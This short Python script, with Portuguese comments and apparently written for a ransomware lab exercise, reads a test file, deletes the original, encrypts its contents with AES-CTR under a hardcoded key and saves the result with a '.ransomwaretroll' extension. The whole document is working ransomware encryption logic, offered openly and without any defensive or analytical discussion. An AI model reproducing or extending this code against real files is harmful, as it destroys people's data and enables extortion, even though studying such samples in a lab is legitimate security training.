import os
import pyaes

# Arquivo de teste do laboratorio
file_name = "teste.txt"

# Abrir o arquivo
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Remover o arquivo original de teste
os.remove(file_name)

# Chave utilizada no laboratorio
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o conteudo
crypto_data = aes.encrypt(file_data)

# Criar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(new_file, "wb")
new_file.write(crypto_data)
new_file.close()
